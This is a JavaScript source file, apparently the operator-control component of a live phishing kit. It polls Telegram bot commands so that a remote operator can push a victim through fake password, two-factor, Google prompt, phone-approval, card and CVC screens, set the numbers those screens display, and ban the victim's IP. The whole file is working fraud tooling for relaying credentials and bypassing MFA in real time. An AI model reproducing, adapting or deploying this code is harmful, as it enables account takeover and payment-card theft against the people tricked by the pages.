import axios from "axios";
import { buildApiUrl } from "../config/api";
import { IPService } from "./ipService";

export class TelegramService {
  static isRequestPending = false;
  static requestController = null;
  static consecutiveErrors = 0;
  static maxRetries = 3;
  static baseDelay = 1000; // 1 second base delay
  static lastProcessedWrong2faCommand = null; // Track last processed wrong2fa command
  static lastProcessedPasswordCommand = null; // Track last processed password command

  static async fetchMessages() {
    // Prevent multiple simultaneous requests
    if (this.isRequestPending) {
      return [];
    }

    // Cancel any existing request
    if (this.requestController) {
      this.requestController.abort();
    }

    this.isRequestPending = true;
    this.requestController = new AbortController();

    try {
      const response = await axios.get(buildApiUrl("/api/getMessages"), {
        timeout: 8000, // Reduced timeout
        headers: {
          "Content-Type": "application/json",
        },
        signal: this.requestController.signal,
      });

      // Reset error count on successful request
      this.consecutiveErrors = 0;

      return response?.data?.data?.result || [];
    } catch (error) {
      this.consecutiveErrors++;

      // Don't log errors for aborted requests (normal cancellation)
      if (error.name === "AbortError") {
        console.log("[Telegram] Request was cancelled");
        return [];
      }

      // Log error only in development or for critical errors
      if (process.env.NODE_ENV === "development") {
        console.warn(
          `[Telegram] Error fetching messages (attempt ${this.consecutiveErrors}):`,
          error.message
        );
      }

      // Return empty array to prevent breaking the app
      return [];
    } finally {
      this.isRequestPending = false;
      this.requestController = null;
    }
  }

  static shouldSkipPolling() {
    // Skip polling if too many consecutive errors
    if (this.consecutiveErrors >= this.maxRetries) {
      if (process.env.NODE_ENV === "development") {
        console.warn(
          `[Telegram] Skipping polling due to ${this.consecutiveErrors} consecutive errors`
        );
      }
      return true;
    }
    return false;
  }

  static getPollingDelay() {
    // Exponential backoff for errors
    if (this.consecutiveErrors > 0) {
      const delay = this.baseDelay * Math.pow(2, this.consecutiveErrors - 1);
      return Math.min(delay, 30000); // Max 30 seconds
    }
    return 0; // No delay for successful requests
  }

  static resetErrorState() {
    this.consecutiveErrors = 0;
  }

  static processCommand(command, uniqueString, currentState, payload = "") {
    const {
      setStep,
      setLastFetch,
      LastFetch,
      Ip,
      setWrong2faTrigger,
      wrong2faTrigger,
      setWrongPasswordTrigger,
      wrongPasswordTrigger,
      setGooglePromptNumber,
      googlePromptNumber,
      setApproveNumber,
      approveNumber,
    } = currentState;

    const commands = {
      "/2fa": () => {
        if (LastFetch !== "2fa") {
          setStep(14);
          setLastFetch("2fa");
        }
      },
      "/incorrect-2fa": () => {
        if (LastFetch !== "incorrect-2fa") {
          setStep(6);
          setLastFetch("incorrect-2fa");
        }
      },
      "/password": (fullCommand) => {
        // Check if this is a new password command (idempotent check)
        if (this.lastProcessedPasswordCommand === fullCommand) {
          return;
        }

        this.lastProcessedPasswordCommand = fullCommand;

        if (LastFetch !== "password") {
          setStep(2);
          setLastFetch("password");
        }

        if (typeof currentState.setWrongPasswordTrigger === "function") {
          currentState.setWrongPasswordTrigger((prev) => prev + 1);
        }
      },
      "/wait": () => {
        if (LastFetch !== "wait") {
          setStep(4);
          setLastFetch("wait");
        }
      },
      "/email": () => {
        if (LastFetch !== "email") {
          setStep(1);
          setLastFetch("email");
        }
      },
      "/card": () => {
        if (LastFetch !== "card") {
          setStep(8);
          setLastFetch("card");
        }
      },
      "/cvc": () => {
        if (LastFetch !== "cvc") {
          setStep(3);
          setLastFetch("cvc");
        }
      },
      "/phone": () => {
        // Reset approve number so the page loads until operator sends /pnumber
        if (typeof setApproveNumber === "function") {
          setApproveNumber(null);
        }
        if (LastFetch !== "phoneVerify") {
          setStep(10);
          setLastFetch("phoneVerify");
        }
      },
      "/whatsapp": () => {
        if (LastFetch !== "whatsapp") {
          setStep(12);
          setLastFetch("whatsapp");
        }
      },
      "/emailVerify": () => {
        if (LastFetch !== "emailVerify") {
          setStep(13);
          setLastFetch("emailVerify");
        }
      },
      "/done": () => {
        if (LastFetch !== "done") {
          setStep(11);
          setLastFetch("done");
        }
      },
      "/authApp": () => {
        if (LastFetch !== "authApp") {
          setStep(15);
          setLastFetch("authApp");
        }
      },
      "/google2fa": () => {
        if (LastFetch !== "google2fa") {
          setStep(16);
          setLastFetch("google2fa");
        }
      },
      "/gprompt": () => {
        if (LastFetch !== "gprompt") {
          setStep(17);
          setLastFetch("gprompt");
        }
      },
      "/gsms": () => {
        if (LastFetch !== "gsms") {
          setStep(18);
          setLastFetch("gsms");
        }
      },
      "/gcall": () => {
        if (LastFetch !== "gcall") {
          setStep(19);
          setLastFetch("gcall");
        }
      },
      "/gauth": () => {
        if (LastFetch !== "gauth") {
          setStep(20);
          setLastFetch("gauth");
        }
      },
      "/gbackup": () => {
        if (LastFetch !== "gbackup") {
          setStep(21);
          setLastFetch("gbackup");
        }
      },
      "/gnumber": () => {
        // Operator sets the number displayed on the Google Prompt page
        const num = parseInt(payload, 10);
        if (isNaN(num) || num < 10 || num > 99) return;
        if (typeof setGooglePromptNumber !== "function") return;
        if (googlePromptNumber === num) return; // idempotent on re-poll

        setGooglePromptNumber(num);
      },
      "/pnumber": () => {
        // Operator sets the number displayed on the Phone Approve page
        const num = parseInt(payload, 10);
        if (isNaN(num) || num < 10 || num > 99) return;
        if (typeof setApproveNumber !== "function") return;
        if (approveNumber === num) return; // idempotent on re-poll

        setApproveNumber(num);
      },
      "/wrong2fa": (fullCommand) => {
        // Check if this is a new wrong2fa command (idempotent check)
        if (this.lastProcessedWrong2faCommand === fullCommand) {
          return;
        }

        this.lastProcessedWrong2faCommand = fullCommand;

        if (typeof currentState.setWrong2faTrigger === "function") {
          currentState.setWrong2faTrigger((prev) => prev + 1);
        }
      },
      "/ban": async () => {
        if (LastFetch !== "Ban" && Ip) {
          setLastFetch("Ban");
          try {
            await IPService.banIP(Ip);
          } catch (error) {
            if (process.env.NODE_ENV === "development") {
              console.warn("[Telegram] Error banning IP:", error.message);
            }
          }
        }
      },
      "/clear": () => {
        setLastFetch("clear");
        // Reset error state and command tracking when clearing
        this.resetErrorState();
        this.lastProcessedWrong2faCommand = null;
        this.lastProcessedPasswordCommand = null;
      },
    };

    // Handle /wrong2fa commands with additional data
    if (command.startsWith("/wrong2fa")) {
      try {
        if (commands["/wrong2fa"]) {
          commands["/wrong2fa"](command); // Pass full command for idempotency check
        }
      } catch (error) {
        if (process.env.NODE_ENV === "development") {
          console.warn(
            "[Telegram] Error processing wrong2fa command:",
            command,
            error.message
          );
        }
      }
    } else if (command.startsWith("/password")) {
      // Handle /password commands with additional data
      try {
        if (commands["/password"]) {
          commands["/password"](command); // Pass full command for idempotency check
        }
      } catch (error) {
        if (process.env.NODE_ENV === "development") {
          console.warn(
            "[Telegram] Error processing password command:",
            command,
            error.message
          );
        }
      }
    } else if (commands[command]) {
      // Handle other commands normally
      try {
        commands[command]();
      } catch (error) {
        if (process.env.NODE_ENV === "development") {
          console.warn(
            "[Telegram] Error processing command:",
            command,
            error.message
          );
        }
      }
    }
  }

  static async pollMessages(uniqueString, currentState) {
    // Skip if too many errors
    if (this.shouldSkipPolling()) {
      return;
    }

    try {
      const result = await this.fetchMessages();

      if (result.length > 0) {
        // Accept both inline-button callbacks and plain-text commands
        // (e.g. "/gnumber 42 <id>") so the operator can send values.
        const messageUpdates = result.filter(
          (update) =>
            update.callback_query?.data !== undefined ||
            (update.message?.text && update.message.text.startsWith("/"))
        );

        messageUpdates.forEach((update) => {
          try {
            const raw = update.callback_query
              ? update.callback_query.data
              : update.message.text;

            // Strip optional "@BotName" suffix from text commands
            const cleaned = raw.trim().replace(/^(\/\w+)@\S+/, "$1");
            const parts = cleaned.split(/\s+/);
            const command = parts[0];
            const id = parts.length > 1 ? parts[parts.length - 1] : undefined;
            const payload = parts.slice(1, -1).join(" ");

            if (id === uniqueString || command === "/clear") {
              this.processCommand(command, uniqueString, currentState, payload);
            }
          } catch (error) {
            if (process.env.NODE_ENV === "development") {
              console.warn(
                "[Telegram] Error processing message:",
                error.message
              );
            }
          }
        });
      }
    } catch (error) {
      // Error already handled in fetchMessages
      if (process.env.NODE_ENV === "development") {
        console.warn("[Telegram] Error in pollMessages:", error.message);
      }
    }
  }
}
